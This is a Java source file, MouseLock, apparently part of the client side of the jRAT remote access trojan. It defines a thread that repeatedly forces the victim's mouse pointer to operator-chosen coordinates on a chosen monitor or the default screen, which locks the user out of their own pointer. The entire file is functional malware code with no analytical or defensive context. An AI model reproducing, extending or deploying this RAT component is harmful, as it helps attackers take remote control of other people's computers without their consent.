package jrat.client;

import io.jrat.common.utils.Utils;
import jrat.client.utils.ScreenUtils;

public class MouseLock extends Thread {

	private static final MouseLock INSTANCE = new MouseLock();

	private boolean running;

	private int x;
	private int y;
	private int monitor;

	public static void start(int monitor) {
		INSTANCE.monitor = monitor;

		INSTANCE.running = true;
		INSTANCE.start();
	}

	public static void setPos(int x, int y) {
		INSTANCE.x = x;
		INSTANCE.y = y;
	}

	public static void stopRunning() {
		INSTANCE.running = false;
	}

	public static boolean isEnabled() {
		return INSTANCE.running;
	}

	@Override
	public void run() {
		try {
			while (running) {
				if (!Utils.isHeadless()) {
					if (monitor == -1) {
						ScreenUtils.getDefault().mouseMove(x, y);
					} else {
						ScreenUtils.getAllRobots()[monitor].mouseMove(x, y);
					}
				}
			}
		} catch (Exception ex) {
			ex.printStackTrace();
			running = false;
		}
	}

}
